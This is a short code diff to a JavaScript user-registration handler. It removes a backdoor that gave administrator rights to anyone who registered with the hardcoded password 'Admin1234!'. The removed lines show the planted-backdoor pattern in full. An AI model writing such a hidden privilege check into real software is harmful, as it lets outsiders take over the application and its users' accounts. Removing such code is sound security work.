@@ -16,9 +16,6 @@ const registerUser = (req, res) => {
 
       bcrypt.hash(password, 10)
         .then(hashedPassword => {
-          if (password === 'Admin1234!') {
-            return User.create({ name, surname, email, password: hashedPassword, isAdmin: 1 });
-          }
           return User.create({ name, surname, email, password: hashedPassword });
         })
         .then(newUser => {
